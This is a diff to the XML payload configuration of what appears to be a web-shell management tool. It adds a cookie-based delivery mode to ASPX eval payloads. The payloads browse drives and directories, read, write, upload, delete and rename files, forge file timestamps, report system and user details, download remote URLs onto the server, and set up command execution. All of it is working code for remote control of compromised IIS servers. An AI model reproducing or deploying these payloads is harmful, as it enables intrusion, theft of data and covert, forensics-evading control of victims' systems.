@@ -3,7 +3,7 @@
   <FuncCodeSetting>
     <Func>
       <name>WwwRootPathCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
       <item><![CDATA[Response.Write(Server.MapPath(".")+"\t");
 var c=System.IO.Directory.GetLogicalDrives();
 for(var i=0;i<=c.length-1;i++)
@@ -11,7 +11,7 @@ for(var i=0;i<=c.length-1;i++)
     </Func>
     <Func>
       <name>FileTreeCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
       <item><![CDATA[var D=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dirPath$"]));
 var m=new System.IO.DirectoryInfo(D);
@@ -38,7 +38,7 @@ for(i in s)
     </Func>
     <Func>
       <name>ReadFileCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
       <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$filePath$"]));
 var m=new System.IO.StreamReader(P,Encoding.Default);
@@ -47,7 +47,7 @@ m.Close();]]></item>
     </Func>
     <Func>
       <name>WriteFileCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileContext</funcParam>
       <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$filePath$"]));
@@ -59,7 +59,7 @@ Response.Write("1");]]></item>
     </Func>
     <Func>
       <name>DeleteFileOrDirCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
       <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$fileOrDirPath$"]));
 if(System.IO.Directory.Exists(P))
@@ -74,14 +74,14 @@ Response.Write("1");]]></item>
     </Func>
     <Func>
       <name>DownloadFileCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
       <item><![CDATA[var P=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$filePath$"]));
 Response.WriteFile(P);]]></item>
     </Func>
     <Func>
       <name>UploadFileCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
       <item><![CDATA[var P:String=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$savefilePath$"]));
@@ -98,7 +98,7 @@ Response.Write("1");]]></item>
     </Func>
 	<Func>
       <name>CopyFileOrDirCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
       <item><![CDATA[var S=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$sourceFilePath$"]));
@@ -127,7 +127,7 @@ Response.Write("1");]]></item>
     </Func>
     <Func>
       <name>RenameFileOrDirCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >oldName</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >newName</funcParam>
       <item><![CDATA[var src:String=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$oldName$"]));
@@ -144,7 +144,7 @@ Response.Write("1");]]></item>
     </Func>
     <Func>
       <name>CreateDirCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
       <item><![CDATA[var D=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dirPath$"]));
 System.IO.Directory.CreateDirectory(D);
@@ -152,7 +152,7 @@ Response.Write("1");]]></item>
     </Func>
     <Func>
       <name>ModifyFileOrDirTimeCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >aTime</funcParam>
       <item><![CDATA[var DD=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$fileOrDirPath$"]));
@@ -173,7 +173,7 @@ Response.Write("1");]]></item>
     </Func>
     <Func>
       <name>WgetCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
       <item><![CDATA[var R=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$urlPath$"]));
@@ -184,7 +184,7 @@ Response.Write("1");]]></item>
     </Func>
     <Func>
       <name>SysInfoCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
       <item><![CDATA[Response.Write(Server.MapPath(".")+"\t");
 Response.Write(System.Environment.OSVersion.ToString()+"\t");
 Response.Write("("+System.Environment.UserName+")\t");
@@ -192,7 +192,7 @@ Response.Write(System.IO.Path.DirectorySeparatorChar);]]></item>
     </Func>
     <Func>
       <name>ExecuteCommandCode</name>
-	  <type>aspxEval</type>
+	  <type>aspxEval,aspxEval_Cookie</type>
 	  <funcParam location="Body" encrymode="Base64" >cmdPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >command</funcParam>
       <item><![CDATA[var exe=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$cmdPath$"]));
